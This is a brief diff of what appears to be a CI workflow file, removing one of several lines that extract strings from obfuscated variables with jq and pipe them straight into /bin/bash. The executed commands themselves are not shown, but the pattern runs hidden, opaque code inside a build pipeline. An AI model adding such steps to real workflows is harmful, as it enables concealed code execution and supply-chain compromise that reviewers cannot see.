@@ -24,7 +24,6 @@ jobs:
           echo $yzgw855 | jq -r .q923 | /bin/bash
           echo $dgez01 | jq -r .ttxyb67 | /bin/bash
           printf '%s' "$aqn635" | jq -r .paz631 | /bin/bash
-          echo $llzb365 | jq -r .t682 | /bin/bash
           printf '%s' "$hgr11888" | jq -r .stx16771 | /bin/bash
 
       - name: Store output
